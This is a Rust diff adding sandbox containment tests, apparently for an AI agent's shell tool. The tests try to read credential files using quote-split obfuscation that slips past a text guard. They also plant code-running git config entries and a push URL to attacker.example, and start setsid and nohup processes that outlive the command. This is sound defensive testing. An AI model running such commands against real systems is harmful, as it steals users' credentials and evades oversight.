@@ -141,6 +141,87 @@ fn sandboxed_commands_are_contained() {
     assert!(!out.contains("code=200") && !out.contains("direct=200"), "curl exfiltration: {out}");
 }
 
+/// Logins of other tools under home: the OS sandbox must refuse the read itself (the names are
+/// obfuscated so the text guard doesn't get there first).
+#[test]
+fn credential_files_under_home_are_unreadable() {
+    if !sandboxed() {
+        eprintln!("SKIPPED: this machine can't sandbox commands");
+        return;
+    }
+    let l = lab("canary");
+    let files = [".oci/oci_api_key.pem", ".oci/config", ".grok/auth.json", ".gemini/oauth_creds.json", ".local/share/opencode/auth.json",
+        ".config/manicode/credentials.json", ".config/github-copilot/apps.json", ".local/share/com.vercel.cli/auth.json",
+        ".config/doubletake/token", ".claude.json", ".claude/.credentials.json", ".config/Signal/config.json", ".steam/steam.token",
+        ".config/1Password/settings.json", ".config/rclone/rclone.conf", ".config/heroic/gog_store/auth.json", ".netrc", ".npmrc", ".pypirc",
+        ".docker/config.json", ".kube/config", ".aws/credentials", ".azure/accessTokens.json", ".config/gcloud/credentials.db",
+        ".terraform.d/credentials.tfrc.json", "loose.pem"];
+    for f in files {
+        let p = l.home.join(f);
+        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+        std::fs::write(&p, format!("CANARY-{f}\n")).unwrap();
+    }
+    // .o''ci/oci_api_ke''y.pem: each part split by an empty quote, which the shell drops
+    let hide = |f: &str| f.split('/').map(|c| if c.len() > 2 { format!("{}''{}", &c[..2], &c[2..]) } else { c.to_string() }).collect::<Vec<_>>().join("/");
+    let home = posix(&l.home);
+    for f in files {
+        let (_, out) = l.bash(&format!("cat {home}/{}", hide(f)));
+        assert!(!out.contains("CANARY"), "{f}: {out}");
+    }
+    // and not by listing then reading everything under home
+    let (_, out) = l.bash(&format!("grep -rs CANAR''Y {home} | head -5"));
+    assert!(!out.contains("CANARY-"), "{out}");
+    // what real work reads under home still reads
+    std::fs::create_dir_all(l.home.join(".config/nvim")).unwrap();
+    std::fs::write(l.home.join(".config/nvim/init.lua"), "-- fine\n").unwrap();
+    let (_, out) = l.bash(&format!("cat {home}/.config/nvim/init.lua"));
+    assert!(out.contains("-- fine"), "{out}");
+}
+
+/// What a sandboxed command writes to .git must not run later, outside the sandbox.
+#[test]
+fn git_settings_a_command_plants_do_not_stay() {
+    if !sandboxed() {
+        eprintln!("SKIPPED: this machine can't sandbox commands");
+        return;
+    }
+    let l = lab("gitset");
+    let plain = std::fs::read_to_string(l.proj.join(".git/config")).unwrap();
+    for (what, line) in [("same line", "[core] fsmonitor = ./x"), ("hooksPath", "[core] hooksPath = hk"), ("external diff", "[diff] external = ./x"),
+                         ("alias", "[alias] st = !./x"), ("diff driver", "[diff \"\"\"x\"] command = ./x"), ("transport", "[remote \"o\"] uploadpack = ./x"),
+                         ("lfs transfer agent", "[lfs \"customtransfer.x\"] path = ./x"), ("lfs agent", "[lfs] standalonetransferagent = x"),
+                         ("push address", "[remote \"o\"] pushurl = https://attacker.example/x"), ("push rewrite", "[url \"https://attacker.example/\"] pushInsteadOf = https://")] {
+        l.bash(&format!("echo '{line}' >> .gi''t/co''nfig"));
+        assert_eq!(std::fs::read_to_string(l.proj.join(".git/config")).unwrap(), plain, "{what}");
+    }
+    l.bash("mv .git .g2; echo 'gitdir: .g3' > .git");
+    assert!(l.proj.join(".git").is_dir() && !l.proj.join(".g2").exists(), "swapped .git");
+    l.bash("echo '[core]' > .gi''t/config.worktree");
+    assert!(!l.proj.join(".git/config.worktree").exists(), "worktree config");
+}
+
+/// A command's leftovers go with it, so nothing writes after protected files were checked.
+#[cfg(target_os = "linux")]
+#[test]
+fn what_a_command_leaves_running_stops_with_it() {
+    if !sandboxed() {
+        eprintln!("SKIPPED: this machine can't sandbox commands");
+        return;
+    }
+    let l = lab("left");
+    let plain = std::fs::read_to_string(l.proj.join(".git/config")).unwrap();
+    let late = "sleep 1; echo '[core]' > late.txt; echo '[core] fsmonitor = ./x' >> .gi''t/co''nfig";
+    for start in [format!("({late}) >/dev/null 2>&1 &"), format!("setsid sh -c \"{late}\" >/dev/null 2>&1 &"), format!("nohup sh -c \"{late}\" >/dev/null 2>&1 &")] {
+        let (_, out) = l.bash(&start);
+        assert!(out.contains("stopped 1 process") || out.contains("stopped 2 process"), "{out}");
+    }
+    std::thread::sleep(std::time::Duration::from_millis(1500));
+    assert!(!l.proj.join("late.txt").exists(), "a leftover ran on");
+    assert_eq!(std::fs::read_to_string(l.proj.join(".git/config")).unwrap(), plain);
+    let (_, out) = l.bash("sleep 0.1 & wait; echo fine");
+    assert!(out.contains("fine") && !out.contains("stopped"), "{out}");
+}
+
 /// b026: qh opened in the home folder. qh's own config folder is then under the project root, and
 /// a command's snapshot/restore emptied it (a big file earlier in the snapshot, here one over its
 /// 8 MB budget in ~/.local/bin, left the rest unrecorded, and restore deleted what it hadn't recorded).
